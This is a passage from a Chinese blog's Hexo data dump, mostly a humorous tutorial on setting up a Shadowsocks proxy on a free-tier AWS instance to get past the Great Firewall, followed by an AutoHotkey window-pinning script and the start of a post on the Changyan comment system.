class=\"line\">&quot;method&quot;:&quot;aes-256-cfb&quot;,</div><div class=\"line\"># true 或者 false 开启后能降低延迟</div><div class=\"line\">&quot;fast_open&quot;:false</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure></p>\n<p>关于上面的 <code>fast_open</code> 感兴趣的可以来这里看<a href=\"https://github.com/shadowsocks/shadowsocks/wiki/TCP-Fast-Open\" target=\"_blank\" rel=\"external\">TCP-Fast-Open</a> 我们继续。</p>\n<h3 id=\"启动-shadowsocks\"><a href=\"#启动-shadowsocks\" class=\"headerlink\" title=\"启动 shadowsocks\"></a>启动 shadowsocks</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div></pre></td><td class=\"code\"><pre><div class=\"line\"># 启动</div><div class=\"line\">ssserver -c /etc/shadowsocks/config.json -d start</div><div class=\"line\"># 停止</div><div class=\"line\">ssserver -c /etc/shadowsocks/config.json -d stop</div><div class=\"line\"># 重新启动</div><div class=\"line\">ssserver -c /etc/shadowsocks/config.json -d restart</div></pre></td></tr></table></figure>\n<p>我们这里使用启动命令启动一下试试。<br>如果启动后不确定自己是否成功，可以使用<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">ps -aux | grep ssserver</div></pre></td></tr></table></figure></p>\n<p><code>ps</code>是 linux 查看系统进程的工具，感兴趣可以看看这个命令：<a href=\"http://man.linuxde.net/ps\" target=\"_blank\" rel=\"external\">ps命令</a><br>如果像下图一样能查到相关结果，证明这个进程已经启动成功了。<br><img src=\"/Image/aws_cmd_ps.jpg\" alt=\"aws_cmd_ps\"><br>我们接下来把 shadowsocks 服务端进程设置为开机启动：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">vim /etc/rc.local</div></pre></td></tr></table></figure></p>\n<p>按<code>i</code>进入<code>Insert</code>模式，在<code>exit 0</code>上面的空白行加入：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">sudo ssserver -c /etc/shadowsocks/config.json -d start</div></pre></td></tr></table></figure></p>\n<p>然后<code>esc</code>接着<code>:</code>接着<code>wq</code></p>\n<p>然后我们可以去控制台右键我们的实例重启一下，再通过之前连接服务器的姿势连进去检查一下我们的<code>ssserver</code>进程是否在运行。</p>\n<p>光配置了还不够，aws 还不允许正常访问我们刚刚配置的端口，我们回到 aws 的 web 控制台。<br>配置好我们的出入站规则：<br><img src=\"/Image/aws_secure.jpg\" alt=\"aws_secure\"></p>\n<p><code>端口范围</code>这里填上我们前面设置的端口，如果是多用户配置需要把设置的端口都添加进去。因为我配置的是多用户，所以端口就开放的我使用的端口，单用户直接开放对应端口就好。<br><code>来源</code>下拉框中选择“任何位置”。</p>\n<p>到这里，我们服务器端的操作就结束了。</p>\n<h3 id=\"客户端\"><a href=\"#客户端\" class=\"headerlink\" title=\"客户端\"></a>客户端</h3><p>客户端相对简单了很多<br>来这里下载自己操作系统的客户端：<a href=\"http://shadowsocks.org/en/download/clients.html\" target=\"_blank\" rel=\"external\">shadowsocks 客户端</a><br>下载好以后，配置一下，mac 和 windows 下大同小异，以 mac 的客户端作为讲解：<br><img src=\"/Image/aws_ss_client.jpg\" alt=\"aws_ss_client\">  </p>\n<p>其中的<code>地址</code>填写的为 aws 控制台中 ipv4 字段中的 ip：<br><img src=\"/Image/aws_ip_config.jpg\" alt=\"aws_ip_config\"><br>端口号呢，就是你<code>config.json</code>文件中配置的端口号，密码也是你配置的密码，加密方式也选择配置文件中配置的那个。<br>关于我们客户端的使用，平时用自动代理就好了，如果访问不了，就切全局，简单粗暴。<br><img src=\"/Image/aws_ss_client_config.jpg\" alt=\"aws_ss_client_config\"><br>为了防止流量超出或者此悲剧发生，需要设置账单警报。<br>还有，到期前把你账户下所有AWS实例关闭并销毁，如果使用了 ebs， ebs 也要记得释放，都是辛酸泪…</p>\n<p>好了，裤腰带解开这么半天，左手的纸巾准备好，音量自觉调低，我们准备出发～。<br>本次列车途经 <del>「www.google.com」</del>「w*w.s*x.c*m」「w*w.pr*nh*b.com」还没有上车的旅客请抓紧时间上车。<br><img src=\"/Image/xingfu.jpg\" alt=\"xingfu\"></p>\n","site":{"data":{}},"excerpt":"<iframe frameborder=\"no\" border=\"0\" marginwidth=\"0\" marginheight=\"0\" width=\"330\" height=\"86\" src=\"//music.163.com/outchain/player?type=2&id=1077483&auto=0&height=66\"></iframe>   \n\n<h2 id=\"开篇日常BB\"><a href=\"#开篇日常BB\" class=\"headerlink\" title=\"开篇日常BB\"></a>开篇日常BB</h2><p>前几天写了个「从入门到入狱系列」的文章，介绍了 xssgame 的通关经验，心里美滋滋。 </p>\n<p>分享出来后，萌新 DaLao 们纷纷表示「这他妈根本打不开，看他妈的棒棒鸡」<br>难道求学的欲望没有让你的内心躁动不安吗。<br><img src=\"/Image/askwiki.jpg\" alt=\"askwiki\"><br>","more":"<br>话说这一切的起因，要从古老的<strong>「GFW(Great Firewall)」</strong>说起。<br>那是一个……  自！己！去！查！<br><img src=\"/Image/xiangbudaoba.jpg\" alt=\"xiangbudaoba\"><br>好，我们终于费劲笔墨终于把 GFW 讲完了，接下来我们说说：翻墙干嘛。<br>自！己！去！…… 还是说两句吧，要被打。<br>起初呢，是因为听说「w*w.s*x.c*m」「w*w.pr*nh*b.com」这些网站有一些「不可描述的东西」，后来呢，就出不来了……<br><img src=\"/Image/laosiji.jpg\" alt=\"laosiji\"></p>\n<h2 id=\"关于免费与付费的-vpn\"><a href=\"#关于免费与付费的-vpn\" class=\"headerlink\" title=\"关于免费与付费的 vpn\"></a>关于免费与付费的 vpn</h2><p><strong>说来真是惭愧，人类始终对于繁衍后代有着执着且坚定的信念。「墙挡上了不让看？墙在哪呢？把墙扒了，我要看人儿！」</strong><br>萌新在日常生活中也会因为各种各样的原因接触到「翻墙」这个词汇，有点行动力的小伙伴可能会下载各种免费 vpn 软件来排解内心的寂寞。<br>但是呢，免费 vpn 的坑实在是太多了，萌新还是记住一点，天下没有免费的早餐、午餐、晚餐还有夜宵。<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div></pre></td><td class=\"code\"><pre><div class=\"line\">┓┏┓┏┓┃</div><div class=\"line\">┛┗┛┗┛┃＼○／</div><div class=\"line\">┓┏┓┏┓┃  /      STOP</div><div class=\"line\">┛┗┛┗┛┃ノ)</div><div class=\"line\">┓┏┓┏┓┃         USE</div><div class=\"line\">┛┗┛┗┛┃ </div><div class=\"line\">┓┏┓┏┓┃         FREE</div><div class=\"line\">┛┗┛┗┛┃ </div><div class=\"line\">┓┏┓┏┓┃         VPN</div><div class=\"line\">┃┃┃┃┃┃</div></pre></td></tr></table></figure></p>\n<p>这是余弦 DaLao 曾经发过的很经典的一个……一个……这叫啥？算了，就那么个玩意。</p>\n<p>那对萌新来讲，不使用「free vpn」应该换成哪些姿势呢。首先想到的可能是「付费 vpn」，付费的其实也一样有风险。<br>我们使用 vpn 时是把网络请求发给一个中间人，中间人帮你去请求，请求完以后再把得到的回复发给你。<br>这个过程中，你的风险成本是不随着「付费」和「免费」的转换而有所降低或上升的。<br>只能说付费的可能收了钱会相对的良心一点，但是我们不能把良心当作理所应当，你觉得呢。</p>\n<h2 id=\"AWS-SS-的姿势\"><a href=\"#AWS-SS-的姿势\" class=\"headerlink\" title=\"AWS+SS 的姿势\"></a>AWS+SS 的姿势</h2><p>前面说到付费与免费都会在服务商的胯下颤抖<br><img src=\"/Image/burranlie.jpg\" alt=\"buranlie\"><br>那我们就自己搭建一个自己的梯子啊～<br>自己搭建服务时选择服务器要满足几个条件：  </p>\n<blockquote>\n<p>1.有一台属于我们自己的服务器。<br>2.服务器要有「公网 ip」便于我们去访问服务器。<br>3.服务器要能正常访问诸如<del>「www.google.com」</del>「w*w.s*x.c*m」「w*w.pr*nh*b.com」这些网站。<br>4.最好不花钱～</p>\n</blockquote>\n<p>然后我们发现「亚马逊AWS(Amazon Web Services) 云服务」很适合我们:  </p>\n<blockquote>\n<p>1.给你一台属于你的服务器。<br>2.给你分配一个「公网 ip」<br>3.有很多海外服务器可供选择，海外服务器不受 GFW 的限制可以访问「不可描述的网站」。<br>4.免费一年～  </p>\n</blockquote>\n<p><img src=\"/Image/memeda.jpg\" alt=\"memeda\"><br>当然，美中不足就是每个月15G的流量限制，超出要\u001d花钱 QAQ。</p>\n<p>有了服务器以后呢，我们需要在上面跑一个24小时供你使用的翻墙程序「shadowsocks 服务端」。<br>有了服务器上随时待命的程序以后，我们只需要在本地安装一个相应的客户端软件与服务端链接，然后就能顺利通过你自己的服务器访问「不可描述的网站」了。<br>绿色环保无虫害，重点是除了你，没人知道你在看些奇怪的东西。</p>\n<h2 id=\"可能是最不正经的教程\"><a href=\"#可能是最不正经的教程\" class=\"headerlink\" title=\"可能是最不正经的教程\"></a>可能是最不正经的教程</h2><p><img src=\"/Image/aws_welcome.jpg\" alt=\"aws_welcome\"></p>\n<h3 id=\"注册\"><a href=\"#注册\" class=\"headerlink\" title=\"注册\"></a>注册</h3><p>其实呢，按照你的生物本能去注册就可以……<br>这里需要准备一张信用卡，可能会收到「预授权」费用1美刀消费的提示，先别慌，去查查这个「预授权」的交易类型是什么意思让自己放个心。<br>其中有一个身份认证环节，要填写手机号，会有电话打过来要你给出页面中的 pin 码，你可以在手机输入或者一个数字一个数字的读给他听(用英语)，听说好多输入的都有问题，那我这边建议读吧。如果出现点击「Call Me Now」按钮上方会提示你错误，让你联系他们的情况，就点进去提交 <code>case</code>，说明好自己的问题：<br><img src=\"/Image/aws_case.jpg\" alt=\"aws_case\"><br>下面选择 <code>phone</code> 或者 <code>chat</code>。<br>客服人员会联系你，不论 <code>phone</code> 还是 <code>chat</code> 都是英语哦～听不懂的话不用慌，对付对付以后你的邮箱会收到邮件，点击链接进入以后发现这一步已经通过了。</p>\n<p>顺利通过注册后，我们点击这个 EC2 进行创建。<br><img src=\"/Image/aws_ec2.png\" alt=\"aws_ec2\"></p>\n<p>接着如果出现如下情况，就等几个小时后再来试试，最多不超过24小时。<br><img src=\"/Image/aws_wait.png\" alt=\"aws_wait\"></p>\n<h3 id=\"创建\"><a href=\"#创建\" class=\"headerlink\" title=\"创建\"></a>创建</h3><p>创建的时候呢注意左上角要选择推荐选择东京节点<br><img src=\"/Image/aws_jiedian.jpg\" alt=\"aws_jiedian\">  </p>\n<p>为什么推荐东京呢，显然不应该是因为东京的各位老师才选择的，因为东京的节点在物理上离我们国家比较近，能为我们提供较低的延迟，这点在「ssh」（可以理解为远程对我们服务器发送指令进行操作的一种方式）我们的服务器时感受明显，我身边朋友是美国节点，「ssh」远程连接时，终端中打字延迟感明显，很难受。<br>当然只是相对来说，比较推荐东京，其他节点也是可以选择的。</p>\n<p>接下来就是中规中矩的创建流程了。<br><img src=\"/Image/aws_service.png\" alt=\"aws_service\"></p>\n<p><img src=\"/Image/aws_qidong.png\" alt=\"aws_qidong\"></p>\n<p>接下来选择 Amazon 的系统影像<br>这里选择，Amazon Linux AMI、RedHat、Ubuntu都行。我这边选择的是Ubuntu。<br>下面就是选择实例的类型了，也就是选择你的服务器型号，因为我们是抱着不花钱的打算来的，所以我们这里选择 「t2.micro」,注意一下它下面标着「符合条件的免费套餐」。</p>\n<p>接下来的步骤暂时不需要配，我们直接点击右下角含有启动字样的蓝色按钮结束这个流程就好。</p>\n<p>接着有一点需要注意一下，提示你创建秘钥对时，一定要下载下来保存好，多备份几个地方，没有这个东西，你就没办法连接你的服务器了。</p>\n<p>接下来提示你正在启动，并提示你创建账单警告，点进去创建一下，凭借从小锻炼的阅读理解能力进行勾选.</p>\n<p>再下一步就是连接我们服务器了，找到自己的实例如果没有启动的话点击启动，然后在上面右键连接我们的服务器。<br><img src=\"/Image/aws_connect.jpg\" alt=\"aws_connect\"></p>\n<p>连接操作官方文档很详细，可以根据你的系统型号进行选择这里不详细讲了，大家去看文档吧。<a href=\"https://docs.aws.amazon.com/zh_cn/AWSEC2/latest/UserGuide/AccessingInstances.html?icmpid=docs_ec2_console\" target=\"_blank\" rel=\"external\">链接文档</a>  </p>\n<h3 id=\"安装-shadowsocks\"><a href=\"#安装-shadowsocks\" class=\"headerlink\" title=\"安装 shadowsocks\"></a>安装 shadowsocks</h3><p>接下来就不要自信一波了，老老实实的跟着步骤来吧，免得踩坑。<br>下面的「#」代表是我写的注释，不用在终端中输入，不带「#」的就照着样子在终端中敲出来后按回车，然后等结果，如果报错了的话，可以先留言，等不及自己去查一波也是可以的～<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div></pre></td><td class=\"code\"><pre><div class=\"line\"># 获取root权限</div><div class=\"line\">sudo -s</div><div class=\"line\"></div><div class=\"line\"># 更新apt-get</div><div class=\"line\">apt-get update</div><div class=\"line\"></div><div class=\"line\"># 安装 python 的 包管理工具 pip</div><div class=\"line\">apt-get install python-pip</div><div class=\"line\"></div><div class=\"line\"># 安装shadowsocks</div><div class=\"line\">pip install shadowsocks</div></pre></td></tr></table></figure></p>\n<h3 id=\"创建-shadowsocks-的配置文件\"><a href=\"#创建-shadowsocks-的配置文件\" class=\"headerlink\" title=\"创建 shadowsocks 的配置文件\"></a>创建 shadowsocks 的配置文件</h3><p>我们安装好以后需要自己创建一下我们的配置文件，启动的时候再指定这个配置文件就可以了。<br>配置文件的位置可以自由选择，不过建议放在<code>/etc/shadowsocks/</code>下面,这个目录还没有，我们要创建一下。<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\"># 创建 shadowsocks 目录</div><div class=\"line\">mkdir /etc/shadowsocks</div></pre></td></tr></table></figure></p>\n<p>接下来我们把配置文件的内容写好。<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\"># 创建并编辑我们的配置文件 </div><div class=\"line\">vim /etc/shadowsocks/config.json</div></pre></td></tr></table></figure></p>\n<p>如果有没使用过<code>vim</code>的小伙伴不用担心。<br>我们使用<code>vim</code>命令进入编辑模式以后，确定自己的键盘输入法为英文大小写切换为小写。<br>按下<code>i</code>键，观察左下方是否出现<code>INSERT</code>字样，如果有，证明我们进入了编辑模式。<br>接下来我们图省事的话可以把我下面(的代码)直接复制粘贴进去。粘贴的姿势有的是右键就可以粘贴，有的是右键菜单中有粘贴，大家自己研究，如果不行那就只能手动敲进去了。我写的注释记得要删掉哦。<br>如果是手动敲进去，注意请保持自己的输入法维持在英文状态。<br>写好以后按<code>esc</code>键，再按下<code>:</code>键，左下角出现<code>:</code>字样，然后输入<code>wq</code>,这两个字母分别对应保存和退出，然后回车就ok了。<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div></pre></td><td class=\"code\"><pre><div class=\"line\">&#123;</div><div class=\"line\"># 配置服务器 ip，这里填写 0.0.0.0</div><div class=\"line\">&quot;server&quot;:&quot;0.0.0.0&quot;,</div><div class=\"line\"># 配置端口号及各自的密码</div><div class=\"line\"># 这里我用的多用户配置，大家也可以采用单用户配置</div><div class=\"line\"># 端口号如果不懂可以选择跟我相同的，密码修改为自己想设置的密码就好</div><div class=\"line\">&quot;port_password&quot;:&#123;</div><div class=\"line\">     &quot;20610&quot;:&quot;MII**********QEA&quot;</div><div class=\"line\">     &#125;,</div><div class=\"line\"># 超时时间 这个不用修改</div><div class=\"line\">&quot;timeout&quot;:300,</div><div class=\"line\"># 加密算法</div><div class=\"line\">&quot;method&quot;:&quot;aes-256-cfb&quot;,</div><div class=\"line\"># true 或者 false 开启后能降低延迟</div><div class=\"line\">&quot;fast_open&quot;:false</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure></p>\n<p>关于上面的 <code>fast_open</code> 感兴趣的可以来这里看<a href=\"https://github.com/shadowsocks/shadowsocks/wiki/TCP-Fast-Open\" target=\"_blank\" rel=\"external\">TCP-Fast-Open</a> 我们继续。</p>\n<h3 id=\"启动-shadowsocks\"><a href=\"#启动-shadowsocks\" class=\"headerlink\" title=\"启动 shadowsocks\"></a>启动 shadowsocks</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div></pre></td><td class=\"code\"><pre><div class=\"line\"># 启动</div><div class=\"line\">ssserver -c /etc/shadowsocks/config.json -d start</div><div class=\"line\"># 停止</div><div class=\"line\">ssserver -c /etc/shadowsocks/config.json -d stop</div><div class=\"line\"># 重新启动</div><div class=\"line\">ssserver -c /etc/shadowsocks/config.json -d restart</div></pre></td></tr></table></figure>\n<p>我们这里使用启动命令启动一下试试。<br>如果启动后不确定自己是否成功，可以使用<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">ps -aux | grep ssserver</div></pre></td></tr></table></figure></p>\n<p><code>ps</code>是 linux 查看系统进程的工具，感兴趣可以看看这个命令：<a href=\"http://man.linuxde.net/ps\" target=\"_blank\" rel=\"external\">ps命令</a><br>如果像下图一样能查到相关结果，证明这个进程已经启动成功了。<br><img src=\"/Image/aws_cmd_ps.jpg\" alt=\"aws_cmd_ps\"><br>我们接下来把 shadowsocks 服务端进程设置为开机启动：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">vim /etc/rc.local</div></pre></td></tr></table></figure></p>\n<p>按<code>i</code>进入<code>Insert</code>模式，在<code>exit 0</code>上面的空白行加入：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">sudo ssserver -c /etc/shadowsocks/config.json -d start</div></pre></td></tr></table></figure></p>\n<p>然后<code>esc</code>接着<code>:</code>接着<code>wq</code></p>\n<p>然后我们可以去控制台右键我们的实例重启一下，再通过之前连接服务器的姿势连进去检查一下我们的<code>ssserver</code>进程是否在运行。</p>\n<p>光配置了还不够，aws 还不允许正常访问我们刚刚配置的端口，我们回到 aws 的 web 控制台。<br>配置好我们的出入站规则：<br><img src=\"/Image/aws_secure.jpg\" alt=\"aws_secure\"></p>\n<p><code>端口范围</code>这里填上我们前面设置的端口，如果是多用户配置需要把设置的端口都添加进去。因为我配置的是多用户，所以端口就开放的我使用的端口，单用户直接开放对应端口就好。<br><code>来源</code>下拉框中选择“任何位置”。</p>\n<p>到这里，我们服务器端的操作就结束了。</p>\n<h3 id=\"客户端\"><a href=\"#客户端\" class=\"headerlink\" title=\"客户端\"></a>客户端</h3><p>客户端相对简单了很多<br>来这里下载自己操作系统的客户端：<a href=\"http://shadowsocks.org/en/download/clients.html\" target=\"_blank\" rel=\"external\">shadowsocks 客户端</a><br>下载好以后，配置一下，mac 和 windows 下大同小异，以 mac 的客户端作为讲解：<br><img src=\"/Image/aws_ss_client.jpg\" alt=\"aws_ss_client\">  </p>\n<p>其中的<code>地址</code>填写的为 aws 控制台中 ipv4 字段中的 ip：<br><img src=\"/Image/aws_ip_config.jpg\" alt=\"aws_ip_config\"><br>端口号呢，就是你<code>config.json</code>文件中配置的端口号，密码也是你配置的密码，加密方式也选择配置文件中配置的那个。<br>关于我们客户端的使用，平时用自动代理就好了，如果访问不了，就切全局，简单粗暴。<br><img src=\"/Image/aws_ss_client_config.jpg\" alt=\"aws_ss_client_config\"><br>为了防止流量超出或者此悲剧发生，需要设置账单警报。<br>还有，到期前把你账户下所有AWS实例关闭并销毁，如果使用了 ebs， ebs 也要记得释放，都是辛酸泪…</p>\n<p>好了，裤腰带解开这么半天，左手的纸巾准备好，音量自觉调低，我们准备出发～。<br>本次列车途经 <del>「www.google.com」</del>「w*w.s*x.c*m」「w*w.pr*nh*b.com」还没有上车的旅客请抓紧时间上车。<br><img src=\"/Image/xingfu.jpg\" alt=\"xingfu\"></p>"},{"title":"把你的编辑器置顶吧 - AutoHotkey","date":"2017-09-01T06:04:33.000Z","layout":"post","comments":1,"reward":true,"_content":"\n日常编码时总会打开浏览器查查东西，再继续写代码。或者一边看着查出来的内容，一边对照着写自己的代码。\n\n这个时候「码 - 浏览器搜索 - 对照着码」变成了一个经常出现的通用流程。\n\n我们有几种方式来解决这件事情。\n\n- 快捷键反复切换当前 window  \n    页面如果是白底，编辑器恰好是黑底，那眼科欢迎你\n- 非全屏下各占一半。  \n    太硬性，不灵活，拉伸窗口步骤麻烦\n- 双屏  \n    能解决需求，但抱着笔记本跑的时候还是会碰到这个问题\n- **编辑器窗口置顶**\n\n<!--more-->\n\n抱着这种需求，去网上搜索一番，发现了一个叫做 AutoHotkey 的工具。\n\n它的功能不少，如果有一些定制化的需求自己编写脚本来搞定。\n比如我们这次的「窗口置顶」。\n脚本代码：\n```\n;==================================================\n;** 快捷键 Win+ESC 使当前窗口置顶/取消置顶\n;==================================================\n\n#Esc::\nWinSet, AlwaysOnTop, toggle,A\nWinGetTitle, getTitle, A\nWinget, getTop,ExStyle,A\nif (getTop & 0x8)\n    TrayTip 已置顶, 窗口标题: `n%getTitle%,10,1\nelse\n    TrayTip 取消置顶, 窗口标题:`n %getTitle%,10,1\nreturn\n```\n我们需要下载一个叫做 Auto Hotkey 的程序，然后将我们这个脚本保存为后缀为「.ahk」的文件后，在程序里指定一下这个脚本文件，生成一个 exe 可执行程序(base file 选项记得选择 Unicode 64-bit 不然乱码)，双击新生成的 exe 图标就可以了。\n\n至于更多的玩法大家自己探索吧。","source":"_posts/Windows_window_on_top.md","raw":"---\ntitle: 把你的编辑器置顶吧 - AutoHotkey\ndate: 2017-9-1 14:04:33\nlayout: post\ncomments: true\nreward: true\ntags:\n    - 工具\n---\n\n日常编码时总会打开浏览器查查东西，再继续写代码。或者一边看着查出来的内容，一边对照着写自己的代码。\n\n这个时候「码 - 浏览器搜索 - 对照着码」变成了一个经常出现的通用流程。\n\n我们有几种方式来解决这件事情。\n\n- 快捷键反复切换当前 window  \n    页面如果是白底，编辑器恰好是黑底，那眼科欢迎你\n- 非全屏下各占一半。  \n    太硬性，不灵活，拉伸窗口步骤麻烦\n- 双屏  \n    能解决需求，但抱着笔记本跑的时候还是会碰到这个问题\n- **编辑器窗口置顶**\n\n<!--more-->\n\n抱着这种需求，去网上搜索一番，发现了一个叫做 AutoHotkey 的工具。\n\n它的功能不少，如果有一些定制化的需求自己编写脚本来搞定。\n比如我们这次的「窗口置顶」。\n脚本代码：\n```\n;==================================================\n;** 快捷键 Win+ESC 使当前窗口置顶/取消置顶\n;==================================================\n\n#Esc::\nWinSet, AlwaysOnTop, toggle,A\nWinGetTitle, getTitle, A\nWinget, getTop,ExStyle,A\nif (getTop & 0x8)\n    TrayTip 已置顶, 窗口标题: `n%getTitle%,10,1\nelse\n    TrayTip 取消置顶, 窗口标题:`n %getTitle%,10,1\nreturn\n```\n我们需要下载一个叫做 Auto Hotkey 的程序，然后将我们这个脚本保存为后缀为「.ahk」的文件后，在程序里指定一下这个脚本文件，生成一个 exe 可执行程序(base file 选项记得选择 Unicode 64-bit 不然乱码)，双击新生成的 exe 图标就可以了。\n\n至于更多的玩法大家自己探索吧。","slug":"Windows_window_on_top","published":1,"updated":"2017-09-07T16:50:45.000Z","photos":[],"link":"","_id":"cjh9h0k860004mkwbvbx4h5bi","content":"<p>日常编码时总会打开浏览器查查东西，再继续写代码。或者一边看着查出来的内容，一边对照着写自己的代码。</p>\n<p>这个时候「码 - 浏览器搜索 - 对照着码」变成了一个经常出现的通用流程。</p>\n<p>我们有几种方式来解决这件事情。</p>\n<ul>\n<li>快捷键反复切换当前 window<br>  页面如果是白底，编辑器恰好是黑底，那眼科欢迎你</li>\n<li>非全屏下各占一半。<br>  太硬性，不灵活，拉伸窗口步骤麻烦</li>\n<li>双屏<br>  能解决需求，但抱着笔记本跑的时候还是会碰到这个问题</li>\n<li><strong>编辑器窗口置顶</strong></li>\n</ul>\n<a id=\"more\"></a>\n<p>抱着这种需求，去网上搜索一番，发现了一个叫做 AutoHotkey 的工具。</p>\n<p>它的功能不少，如果有一些定制化的需求自己编写脚本来搞定。<br>比如我们这次的「窗口置顶」。<br>脚本代码：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div></pre></td><td class=\"code\"><pre><div class=\"line\">;==================================================</div><div class=\"line\">;** 快捷键 Win+ESC 使当前窗口置顶/取消置顶</div><div class=\"line\">;==================================================</div><div class=\"line\"></div><div class=\"line\">#Esc::</div><div class=\"line\">WinSet, AlwaysOnTop, toggle,A</div><div class=\"line\">WinGetTitle, getTitle, A</div><div class=\"line\">Winget, getTop,ExStyle,A</div><div class=\"line\">if (getTop &amp; 0x8)</div><div class=\"line\">    TrayTip 已置顶, 窗口标题: `n%getTitle%,10,1</div><div class=\"line\">else</div><div class=\"line\">    TrayTip 取消置顶, 窗口标题:`n %getTitle%,10,1</div><div class=\"line\">return</div></pre></td></tr></table></figure></p>\n<p>我们需要下载一个叫做 Auto Hotkey 的程序，然后将我们这个脚本保存为后缀为「.ahk」的文件后，在程序里指定一下这个脚本文件，生成一个 exe 可执行程序(base file 选项记得选择 Unicode 64-bit 不然乱码)，双击新生成的 exe 图标就可以了。</p>\n<p>至于更多的玩法大家自己探索吧。</p>\n","site":{"data":{}},"excerpt":"<p>日常编码时总会打开浏览器查查东西，再继续写代码。或者一边看着查出来的内容，一边对照着写自己的代码。</p>\n<p>这个时候「码 - 浏览器搜索 - 对照着码」变成了一个经常出现的通用流程。</p>\n<p>我们有几种方式来解决这件事情。</p>\n<ul>\n<li>快捷键反复切换当前 window<br>  页面如果是白底，编辑器恰好是黑底，那眼科欢迎你</li>\n<li>非全屏下各占一半。<br>  太硬性，不灵活，拉伸窗口步骤麻烦</li>\n<li>双屏<br>  能解决需求，但抱着笔记本跑的时候还是会碰到这个问题</li>\n<li><strong>编辑器窗口置顶</strong></li>\n</ul>","more":"<p>抱着这种需求，去网上搜索一番，发现了一个叫做 AutoHotkey 的工具。</p>\n<p>它的功能不少，如果有一些定制化的需求自己编写脚本来搞定。<br>比如我们这次的「窗口置顶」。<br>脚本代码：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div></pre></td><td class=\"code\"><pre><div class=\"line\">;==================================================</div><div class=\"line\">;** 快捷键 Win+ESC 使当前窗口置顶/取消置顶</div><div class=\"line\">;==================================================</div><div class=\"line\"></div><div class=\"line\">#Esc::</div><div class=\"line\">WinSet, AlwaysOnTop, toggle,A</div><div class=\"line\">WinGetTitle, getTitle, A</div><div class=\"line\">Winget, getTop,ExStyle,A</div><div class=\"line\">if (getTop &amp; 0x8)</div><div class=\"line\">    TrayTip 已置顶, 窗口标题: `n%getTitle%,10,1</div><div class=\"line\">else</div><div class=\"line\">    TrayTip 取消置顶, 窗口标题:`n %getTitle%,10,1</div><div class=\"line\">return</div></pre></td></tr></table></figure></p>\n<p>我们需要下载一个叫做 Auto Hotkey 的程序，然后将我们这个脚本保存为后缀为「.ahk」的文件后，在程序里指定一下这个脚本文件，生成一个 exe 可执行程序(base file 选项记得选择 Unicode 64-bit 不然乱码)，双击新生成的 exe 图标就可以了。</p>\n<p>至于更多的玩法大家自己探索吧。</p>"},{"title":"国内无备案网站使用畅言评论系统","date":"2017-05-12T23:50:28.000Z","layout":"post","comments":1,"reward":true,"_content":"\n<iframe frameborder=\"no\" border=\"0\" marginwidth=\"0\" marginheight=\"0\" width=330 height=86 src=\"//music.163.com/outchain/player?type=2&id=5133273&auto=0&height=66\"></iframe>\n\n> 本来朋友圈说昨晚把教程发出来，结果……到家后衣服都没脱就睡了。\n早上五点恢复意识，磨蹭到7点才打开电脑。\n\n<!--more-->\n\n# 背景\n\n畅言评论系统是搜狐搞出来的一个免费的评论系统，对于小站不想花精力去做评论系统的人确实很方便。  \n类似的评论系统常用的有：多说、网易云跟帖、友言等。  